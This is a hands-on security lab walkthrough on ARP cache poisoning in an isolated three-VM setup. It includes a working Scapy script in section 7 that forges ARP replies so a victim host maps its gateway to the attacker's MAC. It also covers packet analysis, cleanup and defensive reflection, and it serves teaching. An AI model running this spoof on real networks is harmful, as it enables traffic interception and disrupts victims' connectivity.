# Title: Day 1 — Lab 2: ARP, Spoofing, and Trust (Expanded Walkthrough)

---

## 🧭 Table of Contents (Heading Links)

- [[# 1. Lab overview ⚠️ trust at layer 2]]
- [[# 2. Learning goals 🎯 what you should be able to do]]
- [[# 3. Lab topology, tools, and safety model 🧰]]
- [[# 4. Theory deep dive — how ARP really works 🔬]]
- [[# 5. Designing a controlled ARP spoof experiment 🧪]]
- [[# 6. Walkthrough part 1 — baseline: normal ARP and ping 🛠️]]
- [[# 7. Walkthrough part 2 — injecting the lie (Scapy spoof) 🧨]]
- [[# 8. Walkthrough part 3 — observing the consequences 👀]]
- [[# 9. Packet analysis — reading forged ARP in Wireshark 📡]]
- [[# 10. Artifact strategy — filenames, manifests, and narratives 📁]]
- [[# 11. Failure modes, debugging, and recovery 🧰]]
- [[# 12. Cleanup, restoration, and packaging 📦]]
- [[# 13. Reflection prompts — turning observation into intuition 🤔]]

---

## 1. Lab overview ⚠️ trust at layer 2

Lab 1 showed you the honest version of the network: a host asks who owns an IP, the right machine answers, and packets flow. Lab 2 is about breaking that honesty on purpose, in a controlled way, so you can see exactly how fragile that trust really is.

In this lab you will stand in the middle of a conversation between a victim host and its gateway and you will convince the victim that you are the gateway. You will not yet forward traffic or build a full man‑in‑the‑middle pipeline; the goal here is more fundamental: prove that a single forged ARP reply is enough to rewrite a machine’s mental model of the network.

By the end of this lab you should be able to look at a single ARP frame in a pcap and say, with confidence, “this is the moment the host started believing a lie.”

[[#🧭 Table of Contents]]

---

## 2. Learning goals 🎯 what you should be able to do

The learning goals for this lab are deliberately narrow and deep.

First, you should be able to explain, in plain language, why ARP is inherently vulnerable. That means you can describe how ARP requests and replies work, what information is trusted, and what is missing in terms of authentication or verification.

Second, you should be able to perform a controlled ARP spoof inside your lab. That includes crafting a forged ARP reply that claims to be the gateway, sending it to the victim, and then proving that the victim’s ARP cache has changed to reflect your lie.

Third, you should be able to capture the entire event in a pcap and then later, without any live environment, reconstruct the story from the packets alone. You should be able to point to specific frames and say: “here is the forged reply, here is the cache before, here is the cache after.”

Finally, you should be able to restore the environment to a clean state and document everything you did in a manifest so that someone else could replay your steps and reach the same conclusions.

[[#🧭 Table of Contents]]

---

## 3. Lab topology, tools, and safety model 🧰

You will use the same three‑node topology as Day 1:

Kali is your attacker box. It sits on the same Layer 2 segment as the victim and the gateway. In this lab, Kali will generate the forged ARP replies using Scapy. Give it an address like `192.168.20.10`.

Ubuntu is your victim. It is a normal Linux host that believes whatever ARP replies it receives. It will be configured with an IP like `192.168.20.20` and a default gateway pointing at pfSense.

pfSense is your gateway or router. It owns the IP `192.168.20.1` on the LAN and has its own MAC address. In a real network this would be your router or firewall; here it is just a VM.

You also need a capture vantage point. That can be pfSense itself (using its packet capture or tcpdump on the LAN interface) or a separate Linux VM bridged into the same network. The key is that this vantage point must see the ARP traffic between Kali, Ubuntu, and pfSense.

Tooling wise, you will use tcpdump or tshark to capture ARP traffic, Wireshark to inspect it visually, the `arp` or `ip neigh` commands on Ubuntu to inspect the ARP cache, and Python with Scapy on Kali to craft and send forged ARP replies.

Safety wise, you must keep this lab strictly inside your isolated environment. ARP spoofing on a production or shared network is not acceptable. You will also commit to restoring the ARP state at the end of the lab and documenting how you did so.

Before you start, create a simple directory structure on Kali to hold all artifacts for Day 1:

```bash
mkdir -p ~/day1_lab2/{pcaps,scans,notes,screenshots,artifacts}
date -u > ~/day1_lab2/scans/lab2_start_time_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

This gives you a clean place to put everything and a timestamped record of when you began.

[[#🧭 Table of Contents]]

---

## 4. Theory deep dive — how ARP really works 🔬

To understand why ARP spoofing works, you need to understand what ARP is trying to solve and how little it actually checks.

Imagine Ubuntu wants to send an IP packet to its gateway at `192.168.20.1`. At Layer 3, Ubuntu knows the destination IP. But Ethernet frames do not use IP addresses; they use MAC addresses. Ubuntu needs to know: “what MAC address should I put in the destination field of the Ethernet frame so that this packet reaches the gateway?”

ARP is the mechanism that answers that question. Ubuntu broadcasts an ARP request on the LAN that essentially says: “who has 192.168.20.1? tell 192.168.20.20.” Every host on the LAN sees this broadcast. The host that owns `192.168.20.1` (pfSense) replies with an ARP reply: “192.168.20.1 is at 02:42:c0:a8:14:01.” Ubuntu receives this reply and updates its ARP cache: it now has a mapping from IP `192.168.20.1` to MAC `02:42:c0:a8:14:01`.

The crucial detail is that ARP does not authenticate the reply. Ubuntu does not ask “is this really the gateway?” It simply accepts the first plausible answer it sees, or it updates its cache whenever it sees a new answer. There is no cryptographic signature, no shared secret, no sequence number. It is pure trust.

This means that if Kali sends an ARP reply that says “192.168.20.1 is at 02:42:c0:a8:14:0a” (Kali’s MAC), Ubuntu has no way to distinguish that from the real gateway’s reply. If Kali’s forged reply arrives last, or arrives repeatedly, Ubuntu will update its ARP cache to point the gateway IP at Kali’s MAC.

At that moment, every packet Ubuntu tries to send to its gateway will instead be sent to Kali. That is the essence of ARP spoofing: you lie about who you are at Layer 2, and the victim believes you.

This lab is about making that moment visible and undeniable.

[[#🧭 Table of Contents]]

---

## 5. Designing a controlled ARP spoof experiment 🧪

Before you type any commands, design the experiment in your head.

You want three phases: a baseline phase where you observe normal ARP behavior, an attack phase where you inject forged ARP replies, and a recovery phase where you restore the correct mapping.

In the baseline phase, you will capture ARP traffic while Ubuntu communicates normally with pfSense. You will record Ubuntu’s ARP cache and confirm that the gateway IP maps to pfSense’s MAC. You will also capture a short ping from Ubuntu to pfSense or from Kali to Ubuntu, just to generate some ARP traffic.

In the attack phase, you will use Scapy on Kali to send ARP replies that claim “192.168.20.1 is at Kali’s MAC” and that are directed at Ubuntu. You will continue capturing ARP traffic during this phase. After sending the forged replies, you will check Ubuntu’s ARP cache again and confirm that the gateway IP now maps to Kali’s MAC.

In the recovery phase, you will either force pfSense to re‑announce its MAC (for example, by using `arping` from pfSense to Ubuntu) or you will reset Ubuntu’s interface so that it flushes its ARP cache and re‑learns the correct mapping. You will then confirm that the ARP cache is back to normal.

Throughout all three phases, you will keep a packet capture running on the LAN and you will save every ARP cache snapshot and every significant command output with an ISO‑timestamped filename. At the end, you will have a pcap that contains both honest and forged ARP traffic and a set of text files that show the ARP cache before, during, and after the attack.

[[#🧭 Table of Contents]]

---

## 6. Walkthrough part 1 — baseline: normal ARP and ping 🛠️

Start on your capture vantage point (pfSense or a Linux bridge). You want to capture only ARP at first, to keep the pcap small and focused.

On the capture host, run:

```bash
sudo tcpdump -i eth0 -w ~/day1_lab2/pcaps/arp_baseline_$(date -u +"%Y%m%dT%H%M%SZ").pcap arp &
echo $! > ~/day1_lab2/artifacts/tcpdump_arp_baseline_pid_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

Replace `eth0` with the actual LAN interface name. This starts a background capture that records only ARP frames. The PID is saved so you can stop it cleanly later.

Now go to Ubuntu and record its ARP cache before any spoofing. This is your baseline truth.

```bash
arp -n > ~/day1_lab2/scans/ubuntu_arp_before_$(date -u +"%Y%m%dT%H%M%SZ").txt
ip neigh show > ~/day1_lab2/scans/ubuntu_ipneigh_before_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

Open the ARP file and confirm that the entry for `192.168.20.1` shows pfSense’s MAC address. This is the mapping you are about to attack.

To generate some normal ARP traffic, you can have Ubuntu ping the gateway:

```bash
ping -c 3 192.168.20.1 | tee ~/day1_lab2/scans/ubuntu_ping_gateway_baseline_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

If the ARP cache was empty, you will see an ARP request and reply in the pcap as Ubuntu learns the gateway’s MAC. Even if the cache was already populated, this ping confirms that the network is functioning normally before you interfere.

Let the capture run for a few more seconds, then stop it cleanly on the capture host:

```bash
kill $(cat ~/day1_lab2/artifacts/tcpdump_arp_baseline_pid_*.txt) || true
```

You now have a baseline pcap that shows honest ARP behavior and a text snapshot of Ubuntu’s ARP cache that matches that behavior.

[[#🧭 Table of Contents]]

---

## 7. Walkthrough part 2 — injecting the lie (Scapy spoof) 🧨

Now you will craft the forged ARP replies on Kali.

First, you need to know Kali’s MAC address on the LAN interface. On Kali, run:

```bash
ip addr show eth0 > ~/day1_lab2/scans/kali_ipaddr_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

Open that file and find the `link/ether` line for `eth0`. It will look something like `02:42:c0:a8:14:0a`. This is the MAC address you will use as the forged gateway MAC.

Next, create a Scapy script that sends ARP replies claiming that the gateway IP belongs to Kali’s MAC and that are directed at Ubuntu. On Kali, create a file:

```bash
cat > ~/day1_lab2/artifacts/arp_spoof_lab2_$(date -u +"%Y%m%dT%H%M%SZ").py << 'EOF'
from scapy.all import ARP, send

# Adjust these values to match your lab
gateway_ip = "192.168.20.1"      # real gateway IP (pfSense)
victim_ip  = "192.168.20.20"     # Ubuntu
attacker_mac = "02:42:c0:a8:14:0a"  # Kali's MAC on LAN

arp_reply = ARP(
    op=2,                # is-at (ARP reply)
    psrc=gateway_ip,     # claim to be the gateway IP
    pdst=victim_ip,      # tell this to the victim
    hwsrc=attacker_mac,  # but use Kali's MAC
    hwdst="ff:ff:ff:ff:ff:ff"  # broadcast or victim MAC if known
)

# Send several replies to increase chance of winning the race
send(arp_reply, count=10, inter=0.2)
EOF
```

Make sure you replace `attacker_mac` with the actual MAC you saw in the `ip addr` output if it differs.

Before you run the script, start a new ARP capture on the capture host so you can see the forged replies:

```bash
sudo tcpdump -i eth0 -w ~/day1_lab2/pcaps/arp_spoof_$(date -u +"%Y%m%dT%H%M%SZ").pcap arp &
echo $! > ~/day1_lab2/artifacts/tcpdump_arp_spoof_pid_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

Now, on Kali, execute the Scapy script:

```bash
sudo python3 ~/day1_lab2/artifacts/arp_spoof_lab2_*.py | tee ~/day1_lab2/scans/arp_spoof_run_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

The script will send ten ARP replies spaced 0.2 seconds apart. Each one says “192.168.20.1 is at Kali’s MAC” and is addressed to Ubuntu.

Let the capture run for a few seconds after the script finishes, then stop it on the capture host:

```bash
kill $(cat ~/day1_lab2/artifacts/tcpdump_arp_spoof_pid_*.txt) || true
```

At this point, if the spoof worked, Ubuntu’s ARP cache should now map the gateway IP to Kali’s MAC.

[[#🧭 Table of Contents]]

---

## 8. Walkthrough part 3 — observing the consequences 👀

Go back to Ubuntu and inspect the ARP cache again:

```bash
arp -n > ~/day1_lab2/scans/ubuntu_arp_after_spoof_$(date -u +"%Y%m%dT%H%M%SZ").txt
ip neigh show > ~/day1_lab2/scans/ubuntu_ipneigh_after_spoof_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

Open the ARP file and look at the entry for `192.168.20.1`. If the spoof succeeded, the MAC address will no longer be pfSense’s MAC; it will be Kali’s MAC. That single line is the proof that Ubuntu has accepted your lie.

To make the effect more concrete, you can try to ping an external IP or the gateway from Ubuntu and watch what happens. If Kali is not forwarding traffic, Ubuntu may lose connectivity because it is now sending packets to Kali instead of pfSense. For example:

```bash
ping -c 3 192.168.20.1 | tee ~/day1_lab2/scans/ubuntu_ping_gateway_after_spoof_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

If the ping fails or behaves differently than before, that is further evidence that the ARP spoof has changed the path of packets.

Even if you do not break connectivity, the key observation is the ARP cache change. The victim’s mental model of “who is the gateway” has been rewritten.

[[#🧭 Table of Contents]]

---

## 9. Packet analysis — reading forged ARP in Wireshark 📡

Now you will turn the raw pcap into a story.

Open the spoof pcap on your analysis machine with Wireshark:

1. Start Wireshark and open `~/day1_lab2/pcaps/arp_spoof_YYYYMMDDTHHMMSSZ.pcap`.
2. In the display filter bar, type `arp` and apply the filter.

You should see a sequence of ARP frames. Some may be normal traffic; others will be the forged replies from Kali.

Find one of the forged replies. You can identify it by looking at the ARP header fields in the packet details pane. Expand the ARP section and look for:

- Sender IP address: this should be `192.168.20.1` (the gateway IP).
- Sender MAC address: this should be Kali’s MAC, not pfSense’s.
- Target IP address: this should be `192.168.20.20` (Ubuntu).
- Operation: this should be “reply” or “is‑at”.

This combination — gateway IP paired with attacker MAC — is the signature of the spoof. This is the packet that lies.

Take a screenshot of this frame and save it with a descriptive name:

```text
~/day1_lab2/screenshots/arp_forged_reply_20260603T0XXXZ.png
```

In your notes, write a short annotation that explains why this frame is forged:

```text
~/day1_lab2/notes/arp_spoof_annotations_20260603T0XXXZ.md

Frame 12: ARP reply, sender IP 192.168.20.1, sender MAC 02:42:c0:a8:14:0a (Kali). Target IP 192.168.20.20 (Ubuntu). This frame claims that the gateway IP belongs to Kali's MAC and is the basis for the ARP cache poisoning.
```

If you also captured the baseline pcap, open it and find a normal ARP reply from pfSense. Compare the sender MAC in that frame to the sender MAC in the forged frame. The difference between those two frames is the difference between truth and lie at Layer 2.

If you want a quick textual summary, you can also use tshark on the spoof pcap:

```bash
tshark -r ~/day1_lab2/pcaps/arp_spoof_*.pcap -Y arp -T fields -e frame.number -e arp.opcode -e arp.src.proto_ipv4 -e arp.src.hw_mac -e arp.dst.proto_ipv4 > ~/day1_lab2/scans/arp_spoof_summary_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

This will give you a table of ARP frames showing which IP claimed which MAC and who the target was. It is a nice textual complement to the Wireshark screenshots.

[[#🧭 Table of Contents]]

---

## 10. Artifact strategy — filenames, manifests, and narratives 📁

Just like in Lab 1, you are not only doing the attack; you are building a record of it.

Every time you run a significant command, you should be saving its output and adding a line to a manifest file. On Kali, create a manifest file if you have not already:

```bash
touch ~/day1_lab2/manifest_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

Then, for each major step, append a line that includes the timestamp, the command, the output path, and a one‑line description. For example:

```text
2026-06-03T02:20Z | sudo tcpdump -i eth0 -w ~/day1_lab2/pcaps/arp_spoof_20260603T022000Z.pcap arp & | ~/day1_lab2/pcaps/arp_spoof_20260603T022000Z.pcap | Started ARP-only capture for spoof experiment
2026-06-03T02:21Z | sudo python3 arp_spoof_lab2_20260603T021600Z.py | ~/day1_lab2/scans/arp_spoof_run_20260603T022100Z.txt | Sent 10 forged ARP replies claiming gateway IP with Kali MAC
2026-06-03T02:22Z | arp -n (Ubuntu) | ~/day1_lab2/scans/ubuntu_arp_after_spoof_20260603T022200Z.txt | ARP cache now maps 192.168.20.1 to Kali MAC
2026-06-03T02:23Z | tshark -r arp_spoof_20260603T022000Z.pcap -Y arp ... | ~/day1_lab2/scans/arp_spoof_summary_20260603T022300Z.txt | Extracted ARP summary showing forged replies
```

This manifest is what turns your lab into something that can be audited. A reviewer can follow the manifest, open the pcap, and confirm your claims.

In your notes, you should also write a short narrative that ties the artifacts together. For example:

```text
~/day1_lab2/notes/arp_spoof_narrative_20260603T0XXXZ.md

1. Baseline: Ubuntu ARP cache shows 192.168.20.1 -> pfSense MAC (02:42:c0:a8:14:01).
2. Attack: Kali sends 10 ARP replies claiming 192.168.20.1 -> Kali MAC (02:42:c0:a8:14:0a).
3. Result: Ubuntu ARP cache now shows 192.168.20.1 -> 02:42:c0:a8:14:0a.
4. Evidence: pcap frame 12 shows forged ARP reply; arp_after_spoof file shows updated cache.
```

This narrative is what you will later turn into a paragraph in a report or a slide in a presentation.

[[#🧭 Table of Contents]]

---

## 11. Failure modes, debugging, and recovery 🧰

Things will sometimes not work on the first try. That is part of the learning.

If Ubuntu’s ARP cache does not change after you run the spoof script, there are several possibilities. The most common is that pfSense is actively sending its own ARP replies, and its replies are winning the race. In that case, you can increase the number of forged replies or the frequency, or you can temporarily reduce pfSense’s ARP chatter by not generating extra traffic.

Another possibility is that your forged ARP replies are not reaching Ubuntu because you are sending them on the wrong interface or from the wrong network. Double‑check that Kali is on the same Layer 2 segment as Ubuntu and pfSense and that you used the correct interface in Scapy. If you have multiple interfaces, you may need to specify the correct one in the `send` call.

If your pcap does not show the forged ARP frames, verify that you are capturing on the correct interface and that your capture filter is not too restrictive. You can temporarily remove the `arp` filter and capture everything to see if the frames are present at all.

If you break connectivity and Ubuntu can no longer reach anything, do not panic. This is expected if you successfully poisoned the ARP cache and Kali is not forwarding traffic. The recovery section below will show you how to restore normal behavior.

As you debug, keep saving the outputs of your diagnostic commands. For example, if you run `ip addr` or `ip neigh` to check something, redirect the output to a file in `~/day1_lab2/scans/` and add a line to your manifest. Even your failures become part of the story.

[[#🧭 Table of Contents]]

---

## 12. Cleanup, restoration, and packaging 📦

When you are satisfied that you have observed the spoof and captured the evidence, you must restore the network to a clean state.

On Ubuntu, you can flush the ARP cache by bouncing the interface:

```bash
sudo ip link set eth0 down
sleep 2
sudo ip link set eth0 up
arp -n > ~/day1_lab2/scans/ubuntu_arp_after_restore_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

Alternatively, from pfSense or another host that legitimately owns the gateway IP, you can send a few ARP announcements to reassert the correct mapping. On pfSense or a Linux host with the gateway IP, you might run:

```bash
sudo arping -c 3 -I eth0 192.168.20.20
```

This sends ARP replies to Ubuntu saying “192.168.20.1 is at pfSense’s MAC,” which should overwrite the poisoned entry.

After restoring, check Ubuntu’s ARP cache again and confirm that `192.168.20.1` now maps back to pfSense’s MAC. Save that snapshot as part of your artifacts.

Finally, stop any remaining tcpdump processes on the capture host:

```bash
pkill -f "tcpdump -i eth0" || true
```

To package the lab for submission or archiving, create a zip file that contains your pcaps, scans, notes, screenshots, and manifest:

```bash
zip -r ~/day1_lab2/artifacts/day1_lab2_package_$(date -u +"%Y%m%dT%H%M%SZ").zip ~/day1_lab2/pcaps ~/day1_lab2/scans ~/day1_lab2/notes ~/day1_lab2/screenshots ~/day1_lab2/artifacts
```

Optionally, create a small README that tells a reviewer exactly how to verify your claim:

```bash
cat > ~/day1_lab2/README_verify_$(date -u +"%Y%m%dT%H%M%SZ").md << 'EOF'
Open the spoof pcap in Wireshark.
Filter: arp
Find a frame where sender IP = 192.168.20.1 and sender MAC = Kali's MAC.
Compare with ubuntu_arp_before_* and ubuntu_arp_after_spoof_* to see the cache change.
EOF
```

[[#🧭 Table of Contents]]

---

## 13. Reflection prompts — turning observation into intuition 🤔

To turn this from a one‑off lab into intuition you can carry into real assessments, take a few minutes to write about what you saw. Create a file like:

```bash
nano ~/day1_lab2/notes/reflections_lab2_$(date -u +"%Y%m%dT%H%M%SZ").md
```

Then answer questions like these in full sentences:

What, exactly, made ARP spoofing possible in this lab? Describe it without using the word “unauthenticated.”

When you looked at the forged ARP frame in Wireshark, what fields told you it was malicious? If you had to teach someone to spot it in five seconds, what would you tell them to look at?

How would you defend a real enterprise network against this kind of attack? Think about technical controls (like dynamic ARP inspection), but also about monitoring and detection.

How does this lab change the way you think about “the gateway” as a concept? Is it a fixed device, or is it just whatever MAC address a host currently believes?

These reflections are not busywork. They are how you convert a sequence of commands into a mental model you can reuse when you are staring at a pcap from a real incident or a bug bounty target.

[[#🧭 Table of Contents]]